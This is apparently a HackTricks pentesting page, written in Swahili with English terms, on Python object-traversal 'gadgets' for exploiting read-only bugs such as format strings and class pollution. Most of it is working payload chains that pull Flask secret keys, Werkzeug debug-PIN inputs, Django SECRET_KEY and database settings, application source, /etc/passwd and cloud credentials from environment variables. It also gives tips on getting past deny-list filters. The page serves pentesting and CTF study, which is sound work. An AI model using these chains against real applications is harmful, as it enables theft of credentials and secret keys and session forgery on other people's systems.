# Gadgets za Kusoma Data ya Ndani ya Python

{{#include ../../banners/hacktricks-training.md}}


## Taarifa za Msingi

Vulnerabilities tofauti kama vile [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) au [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) zinaweza kukuruhusu **kusoma data ya ndani ya Python lakini zisikuruhusu kutekeleza code**. Kwa hivyo, pentester atahitaji kutumia kikamilifu ruhusa hizi za kusoma ili **kupata privileges nyeti na ku-escalate vulnerability**.

### Flask - Soma secret key

Ukurasa mkuu wa application ya Flask huenda ukawa na global object ya **`app`**, ambapo **secret** hii imesanidiwa.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Katika hali hii inawezekana kufikia object hii kwa kutumia gadget yoyote ya **access global objects** kutoka kwenye [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Katika hali ambapo **vulnerability iko kwenye python file tofauti**, unahitaji gadget ya kupitia files ili kufikia file kuu, **access global object `app.secret_key`**, na uweze [**escalate privileges** ukijua key hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Tumia payload hii **kusoma `app.secret_key`**. Ikiwa bug ya awali pia inakupa write primitive (kwa mfano, class pollution), njia hiyo hiyo inaweza kutumika kuibadilisha na kusaini Flask cookies zenye privileges zaidi.

### Werkzeug - machine_id na node uuid

[**Kwa kutumia payload hizi kutoka kwenye writeup hii**](https://vozec.fr/writeups/tweedle-dum-dee/) utaweza kufikia **machine_id** na node ya **uuid**, ambazo ni **private bits** unazohitaji ili [**kutengeneza Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) na kufikia Python console katika `/console` ikiwa **debug mode imewezeshwa**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Kumbuka kwamba unaweza kupata **njia ya ndani ya server ya `app.py`** kwa kuzalisha **error** kwenye ukurasa wa web ambayo **itakupa njia hiyo**.

Ikiwa vulnerability iko kwenye python file tofauti, angalia Flask trick iliyotangulia ili kufikia objects kutoka kwenye python file kuu.

### Django - SECRET_KEY na settings module

Django settings object huwekwa kwenye cache ya `sys.modules` mara application inapoanza. Kwa kutumia read primitives pekee unaweza ku-leak **`SECRET_KEY`**, fallback keys, database credentials au signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ikiwa gadget iliyo hatarini iko kwenye module nyingine, pitia globals kwanza:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` zina thamani sawa na `SECRET_KEY` ya sasa: bado zinathibitisha values za zamani zilizotiwa sahihi wakati wa rotation.<sup>[[1]](#references)</sup> Pia leak `SESSION_ENGINE` na `SESSION_SERIALIZER` ili kubaini haraka kama impact ni cookie forgery pekee au kuna kitu chenye nguvu zaidi. Kwa maelezo ya web impact, angalia [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - soma source code na files

Loaded Python modules kwa kawaida huhifadhi `__loader__`. File-backed loaders mara nyingi hufichua `get_source()` na `get_data()`, ambazo ni **read-only primitives** bora unapoweza kufikia module object lakini si `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Hii ni muhimu sana kwa kudump **config modules, blueprints, helper files au hidden routes** na kurejesha API keys, DSNs, flag paths au gadget entry points za ziada.

Ikiwa una subclass enumeration pekee, tafuta loader kwa jina badala ya kuweka index kwa hard-code:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Ikiwa unaweza kuunda au kufikia generator/coroutine object, frame yake inaweza kuleak globals **bila kuhitaji gadget yoyote ya function `__globals__`**. Hii ni muhimu dhidi ya filters zinazozuia tu dunder names na kusahau frame attributes kama `gi_frame`, `ag_frame`, `cr_frame` au `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Baada ya kupata frame globals, endelea kama ilivyo kwenye gadgets nyingine (`sys.modules`, settings objects, `os.environ`, n.k.). Sandbox escapes za hivi karibuni zinaendelea kugundua tena hili kwa sababu `gi_frame` na `f_globals` si dunder attributes na mara nyingi hunusurika kwenye deny-lists za kijinga.

### Vigezo vya mazingira / cloud creds kupitia modules zilizopakiwa

Jails nyingi bado hu-import `os` au `sys` mahali fulani. Unaweza ku-abuse function yoyote inayoweza kufikiwa ya `__init__.__globals__` ili kupivot kwenye module ya `os` ambayo tayari ime-importiwa na kudump **vigezo vya mazingira** vyenye API tokens, cloud keys au flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ikiwa index ya subclass imechujwa, tumia loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables mara nyingi ndizo secrets pekee zinazohitajika kutoka kwenye read hadi full compromise (cloud IAM keys, database URLs, signing keys, n.k.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) iliruhusu **class pollution** kupitia component requests zilizoundwa mahsusi. Kuweka property path kama `__init__.__globals__` kulimwezesha mshambuliaji kufikia module globals za component na modules zote zilizo-importiwa (k.m. `settings`, `os`, `sys`). Kutoka hapo unaweza ku-leak `SECRET_KEY`, `DATABASES` au service credentials bila code execution. Exploit chain inategemea kusoma pekee na hutumia dunder-gadget patterns zilezile kama zilizo hapo juu.<sup>[[5]](#references)</sup>

### Gadget collections kwa chaining

CTF za hivi karibuni na utafiti wa pyjail vinaonyesha read chains zinazotegemeka, zilizojengwa kwa kutumia attribute access na subclass enumeration pekee. Lists zinazo-maintainiwa na community kama [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) zinaorodhesha mamia ya gadgets ndogo unazoweza kuchanganya ili ku-traverse kutoka kwenye objects hadi `__globals__`, `sys.modules` na hatimaye data nyeti.<sup>[[2]](#references)</sup> Pendelea searches zinazotegemea **attribute/name** badala ya raw subclass indexes, kwa sababu position ya `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, n.k. hubadilika kati ya Python versions na kutokana na libraries za ziada zilizo-importiwa.

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
